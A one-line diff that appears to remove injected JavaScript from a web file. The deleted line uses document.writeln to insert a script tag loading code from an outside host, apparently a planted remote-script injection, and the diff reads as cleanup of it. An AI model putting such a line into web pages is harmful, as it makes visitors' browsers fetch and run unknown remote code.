@@ -1,1 +1,0 @@
-document.writeln("<script src='http:\/\/slb.gedawang.com\/s.php?id=13995'><\/script>");
